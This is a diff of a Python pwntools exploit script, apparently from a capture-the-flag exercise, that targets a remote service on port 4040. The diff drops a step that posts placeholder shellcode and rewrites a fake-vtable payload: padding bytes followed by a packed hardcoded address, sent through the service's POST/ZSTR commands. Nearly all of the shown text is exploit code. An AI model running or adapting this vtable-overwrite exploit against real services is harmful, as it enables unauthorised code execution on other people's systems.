@@ -5,20 +5,10 @@ import struct
 
 c = pwn.remote(sys.argv[1], 4040)
 
-# set up shellcode
-sc = "\xcc\xcc\xcc\xcc"
-
-# post shellcode
-c.send("POST\n")
-c.send("ZSTR\n")
-c.send(sc + "\n")
-c.recvline()
-buf = c.recvline()
-
 # post fake vtable
 c.send("POST\n")
 c.send("ZSTR\n")
-c.send(b"AAAAAAAABBBBBBBB" + struct.pack("<I", int(buf)))
+c.send(b"AAAABBBB" + struct.pack("<I", 0x08048f00))
 c.recvline()
 ptr = c.recvline()
 
